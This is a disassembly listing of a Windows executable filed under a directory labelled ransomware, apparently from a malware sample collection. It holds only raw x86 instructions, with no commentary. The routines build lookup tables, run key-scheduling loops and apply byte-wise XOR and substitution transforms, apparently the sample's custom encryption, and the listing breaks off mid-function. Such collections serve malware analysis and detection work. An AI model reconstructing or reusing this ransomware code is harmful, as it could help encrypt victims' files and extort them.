
malware_samples/ransomware/de1053ee2236b2bdeeec4f1b5ebb9c0b35676196a199d7cc56641d5710d47c53.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	8b 44 24 04          	mov    0x4(%esp),%eax
  401004:	2d 0e 00 07 80       	sub    $0x8007000e,%eax
  401009:	f7 d8                	neg    %eax
  40100b:	6a 00                	push   $0x0
  40100d:	1b c0                	sbb    %eax,%eax
  40100f:	6a 00                	push   $0x0
  401011:	83 e0 06             	and    $0x6,%eax
  401014:	05 17 00 00 c0       	add    $0xc0000017,%eax
  401019:	6a 01                	push   $0x1
  40101b:	50                   	push   %eax
  40101c:	ff 15 00 b0 41 00    	call   *0x41b000
  401022:	cc                   	int3
  401023:	cc                   	int3
  401024:	cc                   	int3
  401025:	cc                   	int3
  401026:	cc                   	int3
  401027:	cc                   	int3
  401028:	cc                   	int3
  401029:	cc                   	int3
  40102a:	cc                   	int3
  40102b:	cc                   	int3
  40102c:	cc                   	int3
  40102d:	cc                   	int3
  40102e:	cc                   	int3
  40102f:	cc                   	int3
  401030:	ff 15 04 b0 41 00    	call   *0x41b004
  401036:	85 c0                	test   %eax,%eax
  401038:	7e 0a                	jle    0x401044
  40103a:	25 ff ff 00 00       	and    $0xffff,%eax
  40103f:	0d 00 00 07 80       	or     $0x80070000,%eax
  401044:	50                   	push   %eax
  401045:	e8 b6 ff ff ff       	call   0x401000
  40104a:	cc                   	int3
  40104b:	cc                   	int3
  40104c:	cc                   	int3
  40104d:	cc                   	int3
  40104e:	cc                   	int3
  40104f:	cc                   	int3
  401050:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401054:	32 c0                	xor    %al,%al
  401056:	41                   	inc    %ecx
  401057:	ba 08 00 00 00       	mov    $0x8,%edx
  40105c:	56                   	push   %esi
  40105d:	8d 49 00             	lea    0x0(%ecx),%ecx
  401060:	0f b6 71 ff          	movzbl -0x1(%ecx),%esi
  401064:	0f b6 c0             	movzbl %al,%eax
  401067:	03 c6                	add    %esi,%eax
  401069:	25 ff 00 00 80       	and    $0x800000ff,%eax
  40106e:	79 07                	jns    0x401077
  401070:	48                   	dec    %eax
  401071:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  401076:	40                   	inc    %eax
  401077:	0f b6 31             	movzbl (%ecx),%esi
  40107a:	0f b6 c0             	movzbl %al,%eax
  40107d:	03 c6                	add    %esi,%eax
  40107f:	25 ff 00 00 80       	and    $0x800000ff,%eax
  401084:	79 07                	jns    0x40108d
  401086:	48                   	dec    %eax
  401087:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  40108c:	40                   	inc    %eax
  40108d:	0f b6 71 01          	movzbl 0x1(%ecx),%esi
  401091:	0f b6 c0             	movzbl %al,%eax
  401094:	03 c6                	add    %esi,%eax
  401096:	25 ff 00 00 80       	and    $0x800000ff,%eax
  40109b:	79 07                	jns    0x4010a4
  40109d:	48                   	dec    %eax
  40109e:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  4010a3:	40                   	inc    %eax
  4010a4:	0f b6 71 02          	movzbl 0x2(%ecx),%esi
  4010a8:	0f b6 c0             	movzbl %al,%eax
  4010ab:	03 c6                	add    %esi,%eax
  4010ad:	25 ff 00 00 80       	and    $0x800000ff,%eax
  4010b2:	79 07                	jns    0x4010bb
  4010b4:	48                   	dec    %eax
  4010b5:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  4010ba:	40                   	inc    %eax
  4010bb:	83 c1 04             	add    $0x4,%ecx
  4010be:	83 ea 01             	sub    $0x1,%edx
  4010c1:	75 9d                	jne    0x401060
  4010c3:	5e                   	pop    %esi
  4010c4:	c2 04 00             	ret    $0x4
  4010c7:	cc                   	int3
  4010c8:	cc                   	int3
  4010c9:	cc                   	int3
  4010ca:	cc                   	int3
  4010cb:	cc                   	int3
  4010cc:	cc                   	int3
  4010cd:	cc                   	int3
  4010ce:	cc                   	int3
  4010cf:	cc                   	int3
  4010d0:	83 ec 0c             	sub    $0xc,%esp
  4010d3:	80 7c 24 10 00       	cmpb   $0x0,0x10(%esp)
  4010d8:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  4010dc:	0f 85 c0 00 00 00    	jne    0x4011a2
  4010e2:	53                   	push   %ebx
  4010e3:	55                   	push   %ebp
  4010e4:	56                   	push   %esi
  4010e5:	57                   	push   %edi
  4010e6:	8d 81 22 00 02 00    	lea    0x20022(%ecx),%eax
  4010ec:	32 d2                	xor    %dl,%dl
  4010ee:	33 ff                	xor    %edi,%edi
  4010f0:	c6 44 24 20 0b       	movb   $0xb,0x20(%esp)
  4010f5:	33 ed                	xor    %ebp,%ebp
  4010f7:	89 44 24 14          	mov    %eax,0x14(%esp)
  4010fb:	eb 03                	jmp    0x401100
  4010fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  401100:	b8 1f 00 00 00       	mov    $0x1f,%eax
  401105:	3b f8                	cmp    %eax,%edi
  401107:	7f 2b                	jg     0x401134
  401109:	0f b6 74 24 20       	movzbl 0x20(%esp),%esi
  40110e:	8b ff                	mov    %edi,%edi
  401110:	0f b6 9c 01 00 00 02 	movzbl 0x20000(%ecx,%eax,1),%ebx
  401117:	00 
  401118:	0f b6 d2             	movzbl %dl,%edx
  40111b:	03 de                	add    %esi,%ebx
  40111d:	03 d3                	add    %ebx,%edx
  40111f:	81 e2 ff 00 00 80    	and    $0x800000ff,%edx
  401125:	79 08                	jns    0x40112f
  401127:	4a                   	dec    %edx
  401128:	81 ca 00 ff ff ff    	or     $0xffffff00,%edx
  40112e:	42                   	inc    %edx
  40112f:	48                   	dec    %eax
  401130:	3b c7                	cmp    %edi,%eax
  401132:	7d dc                	jge    0x401110
  401134:	47                   	inc    %edi
  401135:	81 e7 1f 00 00 80    	and    $0x8000001f,%edi
  40113b:	c6 44 24 13 01       	movb   $0x1,0x13(%esp)
  401140:	79 05                	jns    0x401147
  401142:	4f                   	dec    %edi
  401143:	83 cf e0             	or     $0xffffffe0,%edi
  401146:	47                   	inc    %edi
  401147:	85 ed                	test   %ebp,%ebp
  401149:	7c 32                	jl     0x40117d
  40114b:	66 0f b6 da          	movzbw %dl,%bx
  40114f:	8d 81 22 00 02 00    	lea    0x20022(%ecx),%eax
  401155:	8d 75 01             	lea    0x1(%ebp),%esi
  401158:	66 3b 18             	cmp    (%eax),%bx
  40115b:	75 09                	jne    0x401166
  40115d:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401161:	c6 44 24 13 00       	movb   $0x0,0x13(%esp)
  401166:	05 00 02 00 00       	add    $0x200,%eax
  40116b:	83 ee 01             	sub    $0x1,%esi
  40116e:	75 e8                	jne    0x401158
  401170:	80 7c 24 13 00       	cmpb   $0x0,0x13(%esp)
  401175:	75 06                	jne    0x40117d
  401177:	fe 44 24 20          	incb   0x20(%esp)
  40117b:	eb 83                	jmp    0x401100
  40117d:	8b 44 24 14          	mov    0x14(%esp),%eax
  401181:	66 0f b6 f2          	movzbw %dl,%si
  401185:	66 89 30             	mov    %si,(%eax)
  401188:	45                   	inc    %ebp
  401189:	05 00 02 00 00       	add    $0x200,%eax
  40118e:	81 fd 00 01 00 00    	cmp    $0x100,%ebp
  401194:	89 44 24 14          	mov    %eax,0x14(%esp)
  401198:	0f 8c 62 ff ff ff    	jl     0x401100
  40119e:	5f                   	pop    %edi
  40119f:	5e                   	pop    %esi
  4011a0:	5d                   	pop    %ebp
  4011a1:	5b                   	pop    %ebx
  4011a2:	83 c4 0c             	add    $0xc,%esp
  4011a5:	c2 04 00             	ret    $0x4
  4011a8:	cc                   	int3
  4011a9:	cc                   	int3
  4011aa:	cc                   	int3
  4011ab:	cc                   	int3
  4011ac:	cc                   	int3
  4011ad:	cc                   	int3
  4011ae:	cc                   	int3
  4011af:	cc                   	int3
  4011b0:	83 ec 08             	sub    $0x8,%esp
  4011b3:	53                   	push   %ebx
  4011b4:	55                   	push   %ebp
  4011b5:	56                   	push   %esi
  4011b6:	be 01 00 00 00       	mov    $0x1,%esi
  4011bb:	57                   	push   %edi
  4011bc:	33 db                	xor    %ebx,%ebx
  4011be:	33 ff                	xor    %edi,%edi
  4011c0:	89 74 24 10          	mov    %esi,0x10(%esp)
  4011c4:	43                   	inc    %ebx
  4011c5:	81 e3 ff 00 00 80    	and    $0x800000ff,%ebx
  4011cb:	79 08                	jns    0x4011d5
  4011cd:	4b                   	dec    %ebx
  4011ce:	81 cb 00 ff ff ff    	or     $0xffffff00,%ebx
  4011d4:	43                   	inc    %ebx
  4011d5:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4011d9:	0f b6 99 20 00 02 00 	movzbl 0x20020(%ecx),%ebx
  4011e0:	8d 74 3e 25          	lea    0x25(%esi,%edi,1),%esi
  4011e4:	46                   	inc    %esi
  4011e5:	8b c6                	mov    %esi,%eax
  4011e7:	47                   	inc    %edi
  4011e8:	25 1f 00 00 80       	and    $0x8000001f,%eax
  4011ed:	79 05                	jns    0x4011f4
  4011ef:	48                   	dec    %eax
  4011f0:	83 c8 e0             	or     $0xffffffe0,%eax
  4011f3:	40                   	inc    %eax
  4011f4:	0f b6 84 08 00 00 02 	movzbl 0x20000(%eax,%ecx,1),%eax
  4011fb:	00 
  4011fc:	03 c3                	add    %ebx,%eax
  4011fe:	03 c7                	add    %edi,%eax
  401200:	99                   	cltd
  401201:	bd ff 00 00 00       	mov    $0xff,%ebp
  401206:	f7 fd                	idiv   %ebp
  401208:	b8 00 04 00 00       	mov    $0x400,%eax
  40120d:	42                   	inc    %edx
  40120e:	66 39 84 51 22 00 02 	cmp    %ax,0x20022(%ecx,%edx,2)
  401215:	00 
  401216:	75 cc                	jne    0x4011e4
  401218:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40121c:	33 c0                	xor    %eax,%eax
  40121e:	8d 94 51 22 00 02 00 	lea    0x20022(%ecx,%edx,2),%edx
  401225:	8d 34 18             	lea    (%eax,%ebx,1),%esi
  401228:	81 e6 ff 00 00 80    	and    $0x800000ff,%esi
  40122e:	79 08                	jns    0x401238
  401230:	4e                   	dec    %esi
  401231:	81 ce 00 ff ff ff    	or     $0xffffff00,%esi
  401237:	46                   	inc    %esi
  401238:	c1 e6 09             	shl    $0x9,%esi
  40123b:	66 8b b4 0e 22 00 02 	mov    0x20022(%esi,%ecx,1),%si
  401242:	00 
  401243:	66 89 32             	mov    %si,(%edx)
  401246:	40                   	inc    %eax
  401247:	81 c2 00 02 00 00    	add    $0x200,%edx
  40124d:	3d 00 01 00 00       	cmp    $0x100,%eax
  401252:	7c d1                	jl     0x401225
  401254:	8b 74 24 10          	mov    0x10(%esp),%esi
  401258:	46                   	inc    %esi
  401259:	81 fe 00 01 00 00    	cmp    $0x100,%esi
  40125f:	89 74 24 10          	mov    %esi,0x10(%esp)
  401263:	0f 8c 5b ff ff ff    	jl     0x4011c4
  401269:	5f                   	pop    %edi
  40126a:	5e                   	pop    %esi
  40126b:	5d                   	pop    %ebp
  40126c:	5b                   	pop    %ebx
  40126d:	83 c4 08             	add    $0x8,%esp
  401270:	c2 04 00             	ret    $0x4
  401273:	cc                   	int3
  401274:	cc                   	int3
  401275:	cc                   	int3
  401276:	cc                   	int3
  401277:	cc                   	int3
  401278:	cc                   	int3
  401279:	cc                   	int3
  40127a:	cc                   	int3
  40127b:	cc                   	int3
  40127c:	cc                   	int3
  40127d:	cc                   	int3
  40127e:	cc                   	int3
  40127f:	cc                   	int3
  401280:	53                   	push   %ebx
  401281:	55                   	push   %ebp
  401282:	b8 00 04 00 00       	mov    $0x400,%eax
  401287:	0f b7 d0             	movzwl %ax,%edx
  40128a:	56                   	push   %esi
  40128b:	8b f1                	mov    %ecx,%esi
  40128d:	57                   	push   %edi
  40128e:	8b c2                	mov    %edx,%eax
  401290:	c1 e2 10             	shl    $0x10,%edx
  401293:	8d ae 22 00 02 00    	lea    0x20022(%esi),%ebp
  401299:	0b c2                	or     %edx,%eax
  40129b:	b9 00 80 00 00       	mov    $0x8000,%ecx
  4012a0:	8b fd                	mov    %ebp,%edi
  4012a2:	f3 ab                	rep stos %eax,%es:(%edi)
  4012a4:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4012a8:	57                   	push   %edi
  4012a9:	8b ce                	mov    %esi,%ecx
  4012ab:	e8 20 fe ff ff       	call   0x4010d0
  4012b0:	57                   	push   %edi
  4012b1:	8b ce                	mov    %esi,%ecx
  4012b3:	e8 f8 fe ff ff       	call   0x4011b0
  4012b8:	33 db                	xor    %ebx,%ebx
  4012ba:	8b fe                	mov    %esi,%edi
  4012bc:	8b d5                	mov    %ebp,%edx
  4012be:	8b ff                	mov    %edi,%edi
  4012c0:	33 c0                	xor    %eax,%eax
  4012c2:	8a 0a                	mov    (%edx),%cl
  4012c4:	88 0c 07             	mov    %cl,(%edi,%eax,1)
  4012c7:	0f b6 c9             	movzbl %cl,%ecx
  4012ca:	81 c1 00 01 00 00    	add    $0x100,%ecx
  4012d0:	c1 e1 08             	shl    $0x8,%ecx
  4012d3:	03 c8                	add    %eax,%ecx
  4012d5:	40                   	inc    %eax
  4012d6:	83 c2 02             	add    $0x2,%edx
  4012d9:	3d 00 01 00 00       	cmp    $0x100,%eax
  4012de:	88 1c 31             	mov    %bl,(%ecx,%esi,1)
  4012e1:	7c df                	jl     0x4012c2
  4012e3:	43                   	inc    %ebx
  4012e4:	81 c7 00 01 00 00    	add    $0x100,%edi
  4012ea:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  4012f0:	7c ce                	jl     0x4012c0
  4012f2:	5f                   	pop    %edi
  4012f3:	5e                   	pop    %esi
  4012f4:	5d                   	pop    %ebp
  4012f5:	5b                   	pop    %ebx
  4012f6:	c2 04 00             	ret    $0x4
  4012f9:	cc                   	int3
  4012fa:	cc                   	int3
  4012fb:	cc                   	int3
  4012fc:	cc                   	int3
  4012fd:	cc                   	int3
  4012fe:	cc                   	int3
  4012ff:	cc                   	int3
  401300:	83 ec 38             	sub    $0x38,%esp
  401303:	53                   	push   %ebx
  401304:	b0 19                	mov    $0x19,%al
  401306:	88 44 24 2b          	mov    %al,0x2b(%esp)
  40130a:	88 44 24 2f          	mov    %al,0x2f(%esp)
  40130e:	b0 20                	mov    $0x20,%al
  401310:	88 44 24 30          	mov    %al,0x30(%esp)
  401314:	88 44 24 31          	mov    %al,0x31(%esp)
  401318:	88 44 24 33          	mov    %al,0x33(%esp)
  40131c:	55                   	push   %ebp
  40131d:	56                   	push   %esi
  40131e:	8b f1                	mov    %ecx,%esi
  401320:	b8 0c 00 fe ff       	mov    $0xfffe000c,%eax
  401325:	2b c6                	sub    %esi,%eax
  401327:	89 44 24 14          	mov    %eax,0x14(%esp)
  40132b:	b8 0d 00 fe ff       	mov    $0xfffe000d,%eax
  401330:	2b c6                	sub    %esi,%eax
  401332:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401336:	b8 02 00 fe ff       	mov    $0xfffe0002,%eax
  40133b:	2b c6                	sub    %esi,%eax
  40133d:	89 44 24 18          	mov    %eax,0x18(%esp)
  401341:	b3 32                	mov    $0x32,%bl
  401343:	b8 0e 00 fe ff       	mov    $0xfffe000e,%eax
  401348:	2b c6                	sub    %esi,%eax
  40134a:	88 5c 24 32          	mov    %bl,0x32(%esp)
  40134e:	88 5c 24 41          	mov    %bl,0x41(%esp)
  401352:	89 44 24 28          	mov    %eax,0x28(%esp)
  401356:	57                   	push   %edi
  401357:	b1 7b                	mov    $0x7b,%cl
  401359:	bb 0b 00 fe ff       	mov    $0xfffe000b,%ebx
  40135e:	b8 03 00 fe ff       	mov    $0xfffe0003,%eax
  401363:	2b de                	sub    %esi,%ebx
  401365:	2b c6                	sub    %esi,%eax
  401367:	bf 00 00 fe ff       	mov    $0xfffe0000,%edi
  40136c:	b2 6a                	mov    $0x6a,%dl
  40136e:	2b fe                	sub    %esi,%edi
  401370:	88 4c 24 38          	mov    %cl,0x38(%esp)
  401374:	88 4c 24 42          	mov    %cl,0x42(%esp)
  401378:	88 4c 24 47          	mov    %cl,0x47(%esp)
  40137c:	c6 44 24 34 78       	movb   $0x78,0x34(%esp)
  401381:	c6 44 24 35 61       	movb   $0x61,0x35(%esp)
  401386:	88 54 24 3a          	mov    %dl,0x3a(%esp)
  40138a:	c6 44 24 3e 66       	movb   $0x66,0x3e(%esp)
  40138f:	c6 44 24 41 33       	movb   $0x33,0x41(%esp)
  401394:	c6 44 24 43 4d       	movb   $0x4d,0x43(%esp)
  401399:	c6 44 24 44 74       	movb   $0x74,0x44(%esp)
  40139e:	88 54 24 46          	mov    %dl,0x46(%esp)
  4013a2:	c6 44 24 40 35       	movb   $0x35,0x40(%esp)
  4013a7:	c6 44 24 39 62       	movb   $0x62,0x39(%esp)
  4013ac:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  4013b3:	00 
  4013b4:	8d 8e 00 00 02 00    	lea    0x20000(%esi),%ecx
  4013ba:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4013be:	89 44 24 28          	mov    %eax,0x28(%esp)
  4013c2:	89 7c 24 30          	mov    %edi,0x30(%esp)
  4013c6:	eb 04                	jmp    0x4013cc
  4013c8:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4013cc:	03 f9                	add    %ecx,%edi
  4013ce:	8b c7                	mov    %edi,%eax
  4013d0:	99                   	cltd
  4013d1:	bd 14 00 00 00       	mov    $0x14,%ebp
  4013d6:	f7 fd                	idiv   %ebp
  4013d8:	8d 04 0b             	lea    (%ebx,%ecx,1),%eax
  4013db:	83 c8 1f             	or     $0x1f,%eax
  4013de:	bb 14 00 00 00       	mov    $0x14,%ebx
  4013e3:	0f b6 6c 14 34       	movzbl 0x34(%esp,%edx,1),%ebp
  4013e8:	99                   	cltd
  4013e9:	f7 fb                	idiv   %ebx
  4013eb:	0f b6 44 14 34       	movzbl 0x34(%esp,%edx,1),%eax
  4013f0:	0f af c5             	imul   %ebp,%eax
  4013f3:	8b d7                	mov    %edi,%edx
  4013f5:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4013fb:	c1 e2 08             	shl    $0x8,%edx
  4013fe:	03 d5                	add    %ebp,%edx
  401400:	0f b6 14 32          	movzbl (%edx,%esi,1),%edx
  401404:	03 c7                	add    %edi,%eax
  401406:	33 c2                	xor    %edx,%eax
  401408:	25 ff 00 00 80       	and    $0x800000ff,%eax
  40140d:	79 07                	jns    0x401416
  40140f:	48                   	dec    %eax
  401410:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  401415:	40                   	inc    %eax
  401416:	88 01                	mov    %al,(%ecx)
  401418:	8b 44 24 10          	mov    0x10(%esp),%eax
  40141c:	99                   	cltd
  40141d:	f7 fb                	idiv   %ebx
  40141f:	8b 44 24 18          	mov    0x18(%esp),%eax
  401423:	03 c1                	add    %ecx,%eax
  401425:	83 c8 1f             	or     $0x1f,%eax
  401428:	bd 14 00 00 00       	mov    $0x14,%ebp
  40142d:	0f b6 5c 14 34       	movzbl 0x34(%esp,%edx,1),%ebx
  401432:	99                   	cltd
  401433:	f7 fd                	idiv   %ebp
  401435:	0f b6 54 14 34       	movzbl 0x34(%esp,%edx,1),%edx
  40143a:	0f af d3             	imul   %ebx,%edx
  40143d:	8d 44 3a 01          	lea    0x1(%edx,%edi,1),%eax
  401441:	8b 54 24 10          	mov    0x10(%esp),%edx
  401445:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40144b:	c1 e2 08             	shl    $0x8,%edx
  40144e:	03 d3                	add    %ebx,%edx
  401450:	0f b6 14 32          	movzbl (%edx,%esi,1),%edx
  401454:	33 c2                	xor    %edx,%eax
  401456:	25 ff 00 00 80       	and    $0x800000ff,%eax
  40145b:	79 07                	jns    0x401464
  40145d:	48                   	dec    %eax
  40145e:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  401463:	40                   	inc    %eax
  401464:	88 41 01             	mov    %al,0x1(%ecx)
  401467:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40146b:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  40146e:	8b c3                	mov    %ebx,%eax
  401470:	99                   	cltd
  401471:	f7 fd                	idiv   %ebp
  401473:	8b 44 24 20          	mov    0x20(%esp),%eax
  401477:	03 c1                	add    %ecx,%eax
  401479:	83 c8 1f             	or     $0x1f,%eax
  40147c:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  401482:	c1 e3 08             	shl    $0x8,%ebx
  401485:	0f b6 54 14 34       	movzbl 0x34(%esp,%edx,1),%edx
  40148a:	89 54 24 24          	mov    %edx,0x24(%esp)
  40148e:	99                   	cltd
  40148f:	f7 fd                	idiv   %ebp
  401491:	8b 44 24 24          	mov    0x24(%esp),%eax
  401495:	03 d8                	add    %eax,%ebx
  401497:	0f b6 54 14 34       	movzbl 0x34(%esp,%edx,1),%edx
  40149c:	0f af d0             	imul   %eax,%edx
  40149f:	0f b6 04 33          	movzbl (%ebx,%esi,1),%eax
  4014a3:	8d 54 3a 02          	lea    0x2(%edx,%edi,1),%edx
  4014a7:	33 d0                	xor    %eax,%edx
  4014a9:	81 e2 ff 00 00 80    	and    $0x800000ff,%edx
  4014af:	79 08                	jns    0x4014b9
  4014b1:	4a                   	dec    %edx
  4014b2:	81 ca 00 ff ff ff    	or     $0xffffff00,%edx
  4014b8:	42                   	inc    %edx
  4014b9:	88 51 02             	mov    %dl,0x2(%ecx)
  4014bc:	8b 54 24 28          	mov    0x28(%esp),%edx
  4014c0:	8d 1c 0a             	lea    (%edx,%ecx,1),%ebx
  4014c3:	8b c3                	mov    %ebx,%eax
  4014c5:	99                   	cltd
  4014c6:	f7 fd                	idiv   %ebp
  4014c8:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4014ce:	c1 e3 08             	shl    $0x8,%ebx
  4014d1:	0f b6 44 14 34       	movzbl 0x34(%esp,%edx,1),%eax
  4014d6:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  4014da:	89 44 24 24          	mov    %eax,0x24(%esp)
  4014de:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  4014e1:	83 c8 1f             	or     $0x1f,%eax
  4014e4:	99                   	cltd
  4014e5:	f7 fd                	idiv   %ebp
  4014e7:	8b 44 24 24          	mov    0x24(%esp),%eax
  4014eb:	03 d8                	add    %eax,%ebx
  4014ed:	0f b6 54 14 34       	movzbl 0x34(%esp,%edx,1),%edx
  4014f2:	0f af d0             	imul   %eax,%edx
  4014f5:	0f b6 04 33          	movzbl (%ebx,%esi,1),%eax
  4014f9:	8d 54 3a 03          	lea    0x3(%edx,%edi,1),%edx
  4014fd:	33 d0                	xor    %eax,%edx
  4014ff:	81 e2 ff 00 00 80    	and    $0x800000ff,%edx
  401505:	79 08                	jns    0x40150f
  401507:	4a                   	dec    %edx
  401508:	81 ca 00 ff ff ff    	or     $0xffffff00,%edx
  40150e:	42                   	inc    %edx
  40150f:	8b 7c 24 30          	mov    0x30(%esp),%edi
  401513:	83 44 24 10 04       	addl   $0x4,0x10(%esp)
  401518:	88 51 03             	mov    %dl,0x3(%ecx)
  40151b:	83 c1 04             	add    $0x4,%ecx
  40151e:	8d 14 0f             	lea    (%edi,%ecx,1),%edx
  401521:	83 fa 20             	cmp    $0x20,%edx
  401524:	0f 8c 9e fe ff ff    	jl     0x4013c8
  40152a:	8d 86 00 00 02 00    	lea    0x20000(%esi),%eax
  401530:	50                   	push   %eax
  401531:	8b ce                	mov    %esi,%ecx
  401533:	e8 18 fb ff ff       	call   0x401050
  401538:	6a 00                	push   $0x0
  40153a:	8b ce                	mov    %esi,%ecx
  40153c:	88 86 20 00 02 00    	mov    %al,0x20020(%esi)
  401542:	e8 39 fd ff ff       	call   0x401280
  401547:	5f                   	pop    %edi
  401548:	5e                   	pop    %esi
  401549:	5d                   	pop    %ebp
  40154a:	b0 01                	mov    $0x1,%al
  40154c:	5b                   	pop    %ebx
  40154d:	83 c4 38             	add    $0x38,%esp
  401550:	c3                   	ret
  401551:	cc                   	int3
  401552:	cc                   	int3
  401553:	cc                   	int3
  401554:	cc                   	int3
  401555:	cc                   	int3
  401556:	cc                   	int3
  401557:	cc                   	int3
  401558:	cc                   	int3
  401559:	cc                   	int3
  40155a:	cc                   	int3
  40155b:	cc                   	int3
  40155c:	cc                   	int3
  40155d:	cc                   	int3
  40155e:	cc                   	int3
  40155f:	cc                   	int3
  401560:	55                   	push   %ebp
  401561:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  401565:	83 fd 01             	cmp    $0x1,%ebp
  401568:	57                   	push   %edi
  401569:	8b f9                	mov    %ecx,%edi
  40156b:	0f 8c da 00 00 00    	jl     0x40164b
  401571:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401575:	56                   	push   %esi
  401576:	8b 74 24 18          	mov    0x18(%esp),%esi
  40157a:	55                   	push   %ebp
  40157b:	50                   	push   %eax
  40157c:	56                   	push   %esi
  40157d:	e8 5e 9a 00 00       	call   0x40afe0
  401582:	83 c4 0c             	add    $0xc,%esp
  401585:	83 fd 01             	cmp    $0x1,%ebp
  401588:	75 20                	jne    0x4015aa
  40158a:	0f b6 0e             	movzbl (%esi),%ecx
  40158d:	0f b6 97 20 00 02 00 	movzbl 0x20020(%edi),%edx
  401594:	81 c1 00 01 00 00    	add    $0x100,%ecx
  40159a:	c1 e1 08             	shl    $0x8,%ecx
  40159d:	03 cf                	add    %edi,%ecx
  40159f:	8a 04 0a             	mov    (%edx,%ecx,1),%al
  4015a2:	88 06                	mov    %al,(%esi)
  4015a4:	5e                   	pop    %esi
  4015a5:	5f                   	pop    %edi
  4015a6:	5d                   	pop    %ebp
  4015a7:	c2 0c 00             	ret    $0xc
  4015aa:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  4015ad:	33 c0                	xor    %eax,%eax
  4015af:	85 c9                	test   %ecx,%ecx
  4015b1:	7e 2d                	jle    0x4015e0
  4015b3:	53                   	push   %ebx
  4015b4:	eb 0a                	jmp    0x4015c0
  4015b6:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4015bd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4015c0:	0f b6 14 30          	movzbl (%eax,%esi,1),%edx
  4015c4:	0f b6 5c 30 01       	movzbl 0x1(%eax,%esi,1),%ebx
  4015c9:	81 c2 00 01 00 00    	add    $0x100,%edx
  4015cf:	c1 e2 08             	shl    $0x8,%edx
  4015d2:	03 d7                	add    %edi,%edx
  4015d4:	8a 14 13             	mov    (%ebx,%edx,1),%dl
  4015d7:	88 14 30             	mov    %dl,(%eax,%esi,1)
  4015da:	40                   	inc    %eax
  4015db:	3b c1                	cmp    %ecx,%eax
  4015dd:	7c e1                	jl     0x4015c0
  4015df:	5b                   	pop    %ebx
  4015e0:	0f b6 87 20 00 02 00 	movzbl 0x20020(%edi),%eax
  4015e7:	0f b6 54 2e ff       	movzbl -0x1(%esi,%ebp,1),%edx
  4015ec:	83 f0 55             	xor    $0x55,%eax
  4015ef:	81 c2 00 01 00 00    	add    $0x100,%edx
  4015f5:	03 c7                	add    %edi,%eax
  4015f7:	c1 e2 08             	shl    $0x8,%edx
  4015fa:	8a 04 02             	mov    (%edx,%eax,1),%al
  4015fd:	88 44 2e ff          	mov    %al,-0x1(%esi,%ebp,1)
  401601:	8b c1                	mov    %ecx,%eax
  401603:	83 f8 01             	cmp    $0x1,%eax
  401606:	7c 28                	jl     0x401630
  401608:	eb 06                	jmp    0x401610
  40160a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401610:	0f b6 14 30          	movzbl (%eax,%esi,1),%edx
  401614:	0f b6 4c 30 ff       	movzbl -0x1(%eax,%esi,1),%ecx
  401619:	81 c2 00 01 00 00    	add    $0x100,%edx
  40161f:	c1 e2 08             	shl    $0x8,%edx
  401622:	03 cf                	add    %edi,%ecx
  401624:	8a 0c 0a             	mov    (%edx,%ecx,1),%cl
  401627:	88 0c 30             	mov    %cl,(%eax,%esi,1)
  40162a:	48                   	dec    %eax
  40162b:	83 f8 01             	cmp    $0x1,%eax
  40162e:	7d e0                	jge    0x401610
  401630:	0f b6 16             	movzbl (%esi),%edx
  401633:	0f b6 87 20 00 02 00 	movzbl 0x20020(%edi),%eax
  40163a:	81 c2 00 01 00 00    	add    $0x100,%edx
  401640:	c1 e2 08             	shl    $0x8,%edx
  401643:	03 d7                	add    %edi,%edx
  401645:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  401648:	88 0e                	mov    %cl,(%esi)
  40164a:	5e                   	pop    %esi
  40164b:	5f                   	pop    %edi
  40164c:	5d                   	pop    %ebp
  40164d:	c2 0c 00             	ret    $0xc
  401650:	83 ec 24             	sub    $0x24,%esp
  401653:	56                   	push   %esi
  401654:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  401658:	0f b6 08             	movzbl (%eax),%ecx
  40165b:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  40165f:	80 f1 a3             	xor    $0xa3,%cl
  401662:	80 f2 54             	xor    $0x54,%dl
  401665:	88 4c 24 04          	mov    %cl,0x4(%esp)
  401669:	0f b6 48 02          	movzbl 0x2(%eax),%ecx
  40166d:	88 54 24 05          	mov    %dl,0x5(%esp)
  401671:	0f b6 50 03          	movzbl 0x3(%eax),%edx
  401675:	f6 d1                	not    %cl
  401677:	80 f2 75             	xor    $0x75,%dl
  40167a:	88 4c 24 06          	mov    %cl,0x6(%esp)
  40167e:	0f b6 48 04          	movzbl 0x4(%eax),%ecx
  401682:	88 54 24 07          	mov    %dl,0x7(%esp)
  401686:	0f b6 50 05          	movzbl 0x5(%eax),%edx
  40168a:	80 f1 e7             	xor    $0xe7,%cl
  40168d:	80 f2 44             	xor    $0x44,%dl
  401690:	88 4c 24 08          	mov    %cl,0x8(%esp)
